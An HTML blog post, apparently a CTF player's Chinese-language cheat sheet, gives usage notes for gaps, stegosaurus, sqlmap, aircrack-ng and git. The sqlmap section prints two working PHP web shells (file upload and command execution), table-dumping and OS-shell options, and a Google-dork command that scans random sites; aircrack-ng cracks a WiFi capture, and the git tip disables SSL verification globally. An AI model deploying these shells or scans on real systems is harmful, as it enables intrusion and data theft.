@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    <title>命令行工具简单使用 | 吴家兴的博客</title>
+    
+    
+        <meta property="og:site_name" content="吴家兴的博客">
+    
+    
+        <meta property="article:author" content="WuJiaxing">
+    
+    
+        <link rel="icon" href="/img/favicon.ico">
+    
+    
+<link rel="stylesheet" href="/css/minireset.min.css">
+
+    
+<link rel="stylesheet" href="/css/all.min.css">
+
+    
+<link rel="stylesheet" href="/css/csshake.min.css">
+
+    
+<link rel="stylesheet" href="/css/hljs/lioshi.css">
+
+    
+<link rel="stylesheet" href="/css/jquery.fancybox.min.css">
+
+    
+<link rel="stylesheet" href="/styl/main.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/highlight.min.js"></script>
+
+    
+<script src="/js/jquery.fancybox.min.js"></script>
+
+    
+<script src="/js/clipboard.min.js"></script>
+
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <header>
+  <div class="outer">
+    <div class="inner">
+      <h1 class="logo-wrap">
+        <a>吴家兴的博客<b><sup>1.2</sup></b></a>
+      </h1>
+    </div>
+    <div class="inner">
+      <nav class="main-nav">
+        
+          
+            <a href="/">首页</a>
+          
+        
+          
+            <a href="/archives">归档</a>
+          
+        
+          
+            <a href="/categories">分类</a>
+          
+        
+          
+            <a href="/tags">标签</a>
+          
+        
+          
+            <a href="/friends">友链</a>
+          
+        
+          
+            <a href="/about">关于</a>
+          
+        
+          
+            <div class="dropdown">
+              <a class="dropbtn">个人项目</a>
+              <div class="dropdown-content">
+                
+                  <a href="http://prowiki.wujiaxing.cn/" target="_blank" rel="noopener">Hexo主题</a>
+                
+                  <a href="https://readflag.cn/" target="_blank" rel="noopener">CTF在线工具</a>
+                
+                  <a href="https://search.readflag.cn/" target="_blank" rel="noopener">CTF题目搜索</a>
+                
+              </div>
+            </div>
+          
+        
+      </nav>
+    </div>
+  </div>
+</header>
+    <div class="content">
+        <section class="outer">
+    <article>
+        <div class="article-title">
+    <h2>
+        <a href="/2021/01/25/5e5d138a/" class="shake shake-little" title="命令行工具简单使用">
+            
+            命令行工具简单使用
+        </a>
+    </h2>
+    <div class="meta_box">
+    
+        
+        
+            
+                
+        
+        <div class="meta meta_auth">
+            <img src="/img/default.png" alt="head" />
+            <p>anonymous</p>
+        </div>
+    
+        
+        
+        <div class="meta meta_date">
+            <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+            <p>发布于：2021年01月25日</p>
+        </div>
+    
+        <div class="meta meta_update">
+            <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+            <p>更新于：2021年07月02日</p>
+        </div>
+    </div>
+    
+
+</div>
+
+        <hr>
+        <div class="article-entry">
+            
+            
+            
+            <a id="more"></a>
+<h3 id="gaps"><a href="#gaps" class="headerlink" title="gaps"></a>gaps</h3><p>源码链接：<a href="https://github.com/nemanja-m/gaps" target="_blank" rel="noopener">https://github.com/nemanja-m/gaps</a></p>
+<p>功能说明：基于遗传算法的拼图求解工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 碎片拼在一张图片上</span><br><span class="hljs-comment"># kali安装montage命令</span><br>sudo apt-get -y install graphicsmagick-imagemagick-compat<br><span class="hljs-comment"># montage 拼接的图片 -tile 行数*列数 -geometry 结果宽x结果高+碎片左右边框宽+碎片上下边框宽 结果图片</span><br>montage *.png -tile 15x15 -geometry 900x900+0+0 test.png<br><br><span class="hljs-comment"># 2. 自动拼图</span><br><span class="hljs-comment"># --size=单个碎片大小（像素，碎片不是正方形就先调整test.png）</span><br>gaps --image=test.png --generation=30 --population=300 --size=91<br></code></pre></td></tr></table></figure>
+
+<h3 id="stegosaurus"><a href="#stegosaurus" class="headerlink" title="stegosaurus"></a>stegosaurus</h3><p>源码链接：<a href="https://github.com/AngelKitty/stegosaurus" target="_blank" rel="noopener">https://github.com/AngelKitty/stegosaurus</a></p>
+<p>功能说明：python字节码文件隐写，隐写文件可以是py, pyc 或者 pyo</p>
+<p>环境要求：python3.6及以下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1.查看文件可隐写的字节数</span><br>stegosaurus.py 文件名 -r<br><br><span class="hljs-comment"># 2.加密</span><br>stegosaurus.py 文件名 -s --playload <span class="hljs-string">"隐写的信息"</span><br><br><span class="hljs-comment"># 3.解密</span><br>stegosaurus.py 文件名 -x<br></code></pre></td></tr></table></figure>
+
+<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>官网链接：<a href="http://sqlmap.org/" target="_blank" rel="noopener">http://sqlmap.org/</a></p>
+<p>功能说明：SQL注入自动测试工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装</span><br>pip install --upgrade sqlmap<br><br><span class="hljs-comment"># 常见参数</span><br>sqlmap -u <span class="hljs-string">"http://127.0.0.1/?id=1"</span> --dbms mysql --dbs<br>sqlmap -u <span class="hljs-string">"http://127.0.0.1/?id=1"</span> --dbms mysql -D users --tables<br>sqlmap -u <span class="hljs-string">"http://127.0.0.1/?id=1"</span> --dbms mysql -D users -T secret_table --columns<br>sqlmap -u <span class="hljs-string">"http://127.0.0.1/?id=1"</span> --dbms mysql -D users -T secret_table -C <span class="hljs-string">"name,pass"</span> --dump<br>sqlmap -u <span class="hljs-string">"http://127.0.0.1/?id=1"</span> --dbms mysql -D users -T secret_table --dump<br><br><span class="hljs-comment"># post参数值</span><br>sqlmap -u <span class="hljs-string">"http://127.0.0.1/"</span> --data <span class="hljs-string">"id=1"</span> --dbms mysql --dbs<br><br><span class="hljs-comment"># 自动从界面获取表单参数</span><br>sqlmap -u <span class="hljs-string">"http://127.0.0.1/"</span> --forms --dbms mysql --dbs<br><br><span class="hljs-comment"># 输入文件：burpsuite =&gt; copy to file</span><br>sqlmap -r req.txt --dbms mysql --dbs<br><span class="hljs-comment"># req.txt内容如下</span><br><span class="hljs-string">''</span><span class="hljs-string">'</span><br><span class="hljs-string">POST / HTTP/1.1</span><br><span class="hljs-string">Host: ip:port</span><br><span class="hljs-string"></span><br><span class="hljs-string">search=1</span><br><span class="hljs-string">'</span><span class="hljs-string">''</span><br><br><br><span class="hljs-comment"># 其他可选配置项</span><br>--batch                   所有选项不询问，保持默认<br>--random-agent            随机设置请求头<br>--cookie <span class="hljs-string">"user=admin"</span>     加入cookie信息<br>-p <span class="hljs-string">"id"</span>                   可测试的参数<br>--level 1                 探测等级，1-5<br>--risk 1                  风险等级，1-3<br>--delay=DELAY             设定两个请求间的延迟，设置0.5表示半秒，默认无延迟<br>--timeout=TIMEOUT         一个请求的超时时间，默认30秒<br>--threads=THREADS         请求线程数，默认为1<br>--tech=BTECH              SQL注入技术，默认BEUST<br>--sql-query=QUERY         要执行的SQL语句<br>--sql-shell               交互式SQL shell<br>--sql-file=SQLFILE        要执行的SQL文件<br>--os-cmd=OSCMD            执行操作系统命令<br>--os-shell                UDF提权，自动上传shell文件（一个文件上传，一个命令执行?cmd=），退出时自动删除文件<br>--file-read FILE          读文件<br>--file-write              写文件<br>-o                        优化sqlmap性能<br></code></pre></td></tr></table></figure>
+
+<p>文件上传shell源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_REQUEST[<span class="hljs-string">"upload"</span>]))&#123;$dir=$_REQUEST[<span class="hljs-string">"uploadDir"</span>];<span class="hljs-keyword">if</span> (phpversion()&lt;<span class="hljs-string">'4.1.0'</span>)&#123;$file=$HTTP_POST_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>];@move_uploaded_file($HTTP_POST_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>],$dir.<span class="hljs-string">"/"</span>.$file) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>();&#125;<span class="hljs-keyword">else</span>&#123;$file=$_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>];@move_uploaded_file($_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>],$dir.<span class="hljs-string">"/"</span>.$file) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>();&#125;@chmod($dir.<span class="hljs-string">"/"</span>.$file,<span class="hljs-number">0755</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">"File uploaded"</span>;&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;form action="</span>.$_SERVER[<span class="hljs-string">"PHP_SELF"</span>].<span class="hljs-string">" method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=/var/www/html/&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;"</span>;&#125;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>命令执行shell源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> $c=$_REQUEST[<span class="hljs-string">"cmd"</span>];@set_time_limit(<span class="hljs-number">0</span>);@ignore_user_abort(<span class="hljs-number">1</span>);@ini_set(<span class="hljs-string">"max_execution_time"</span>,<span class="hljs-number">0</span>);$z=@ini_get(<span class="hljs-string">"disable_functions"</span>);<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($z))&#123;$z=preg_replace(<span class="hljs-string">"/[, ]+/"</span>,<span class="hljs-string">','</span>,$z);$z=explode(<span class="hljs-string">','</span>,$z);$z=array_map(<span class="hljs-string">"trim"</span>,$z);&#125;<span class="hljs-keyword">else</span>&#123;$z=<span class="hljs-keyword">array</span>();&#125;$c=$c.<span class="hljs-string">" 2&gt;&amp;1\n"</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span><span class="hljs-params">($n)</span></span>&#123;<span class="hljs-keyword">global</span> $z;<span class="hljs-keyword">return</span> is_callable($n)<span class="hljs-keyword">and</span>!in_array($n,$z);&#125;<span class="hljs-keyword">if</span>(f(<span class="hljs-string">"system"</span>))&#123;ob_start();system($c);$w=ob_get_clean();&#125;<span class="hljs-keyword">elseif</span>(f(<span class="hljs-string">"proc_open"</span>))&#123;$y=proc_open($c,<span class="hljs-keyword">array</span>(<span class="hljs-keyword">array</span>(pipe,r),<span class="hljs-keyword">array</span>(pipe,w),<span class="hljs-keyword">array</span>(pipe,w)),$t);$w=<span class="hljs-keyword">NULL</span>;<span class="hljs-keyword">while</span>(!feof($t[<span class="hljs-number">1</span>]))&#123;$w.=fread($t[<span class="hljs-number">1</span>],<span class="hljs-number">512</span>);&#125;@proc_close($y);&#125;<span class="hljs-keyword">elseif</span>(f(<span class="hljs-string">"shell_exec"</span>))&#123;$w=shell_exec($c);&#125;<span class="hljs-keyword">elseif</span>(f(<span class="hljs-string">"passthru"</span>))&#123;ob_start();passthru($c);$w=ob_get_clean();&#125;<span class="hljs-keyword">elseif</span>(f(<span class="hljs-string">"popen"</span>))&#123;$x=popen($c,r);$w=<span class="hljs-keyword">NULL</span>;<span class="hljs-keyword">if</span>(is_resource($x))&#123;<span class="hljs-keyword">while</span>(!feof($x))&#123;$w.=fread($x,<span class="hljs-number">512</span>);&#125;&#125;@pclose($x);&#125;<span class="hljs-keyword">elseif</span>(f(<span class="hljs-string">"exec"</span>))&#123;$w=<span class="hljs-keyword">array</span>();exec($c,$w);$w=join(chr(<span class="hljs-number">10</span>),$w).chr(<span class="hljs-number">10</span>);&#125;<span class="hljs-keyword">else</span>&#123;$w=<span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">echo</span><span class="hljs-string">"&lt;pre&gt;$w&lt;/pre&gt;"</span>;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 结合google dork（高级的Google查询技巧）<br>python sqlmap.py -g &quot;inurl:\&quot;php?id&#x3D;\&quot;&quot; --random-agent -f --batch --answer&#x3D;&quot;extending&#x3D;N,follow&#x3D;N,keep&#x3D;N,exploit&#x3D;n&quot;<br></code></pre></td></tr></table></figure>
+
+<h3 id="aircrack-ng"><a href="#aircrack-ng" class="headerlink" title="aircrack-ng"></a>aircrack-ng</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看握手包信息</span><br>aircrack-ng  cacosmia.cap<br><span class="hljs-comment"># 破解wifi密码，得到：12345678</span><br>aircrack-ng  cacosmia.cap  -w  /usr/share/wordlists/rockyou.txt<br><span class="hljs-comment"># 解密压缩包</span><br>airdecap-ng  cacosmia.cap -e mamawoxiangwantiequan -p 12345678<br></code></pre></td></tr></table></figure>
+
+<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><h4 id="push失败"><a href="#push失败" class="headerlink" title="push失败"></a>push失败</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 错误信息1</span><br>fatal: unable to access <span class="hljs-string">'https://github.com/docimg/CTFd.git/'</span>: SSL certificate problem: self signed certificate <span class="hljs-keyword">in</span> certificate chain<br><span class="hljs-comment"># 错误信息2</span><br>OpenSSL SSL_read: Connection was reset, errno 10054<br><br>解决办法：<br><span class="hljs-comment"># 解除ssl验证</span><br>git config --global http.sslVerify <span class="hljs-literal">false</span><br><span class="hljs-comment"># 文件太大</span><br>git config --global http.postBuffer 524288000<br><span class="hljs-comment"># 路径太长</span><br>git config --global core.longpaths <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
+
+<p>参考链接：<a href="http://www.9lyp.com/article/info/details/id/76" target="_blank" rel="noopener">http://www.9lyp.com/article/info/details/id/76</a></p>
+
+            <div class="article-copyright">
+                
+    <blockquote>
+        <p>
+            版权声明：本文为「Blog.WuJiaxing.Cn」的原创文章，博客内容遵循 署名-非商业性使用-相同方式共享 协议。<br>本文永久链接是：https://blog.wujiaxing.cn/2021/01/25/5e5d138a/
+        </p>
+    </blockquote>
+
+
+            </div>
+        </div>
+    </article>
+    
+
+    <section id="toc-div" >
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#gaps"><span class="toc-text">gaps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stegosaurus"><span class="toc-text">stegosaurus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap"><span class="toc-text">sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#aircrack-ng"><span class="toc-text">aircrack-ng</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#git"><span class="toc-text">git</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#push失败"><span class="toc-text">push失败</span></a></li></ol></li></ol>
+    </section>
+    <section id="gohome" style="display: none;"><a><i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i></a></section>
+
+
+</section>
+    </div>
+    <footer>
+    <div class="outer">
+        <div class="inner">
+            Powered by <a href="https://blog.wujiaxing.cn" target="_blank">ProWiki</a>
+            &copy;2022 WuJiaxing<br>
+            <a href="http://beian.miit.gov.cn/" target="_blank" rel="noopener">冀ICP备00000000号</a>
+        </div>
+    </div>
+</footer>
+
+<script src="/js/custom.js"></script>
+
+
+    <script>onload_content();</script>
+
+</body>
+</html>
